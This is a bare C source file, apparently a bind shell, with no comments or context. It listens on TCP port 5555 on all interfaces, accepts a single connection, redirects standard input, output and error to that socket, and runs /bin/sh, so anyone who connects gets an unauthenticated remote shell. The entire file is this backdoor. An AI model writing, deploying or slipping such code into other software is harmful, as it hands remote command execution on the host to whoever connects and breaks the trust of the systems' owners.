#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(void){

    int listening_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    bind(listening_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));

    listen(listening_socket, 5);

    int accepted_socket = accept(listening_socket, NULL, NULL);
    
    for(int i = 0; i < 3; i++){
        dup2(accepted_socket, i);
    }
    

    execve("/bin/sh", NULL, NULL);
    

}
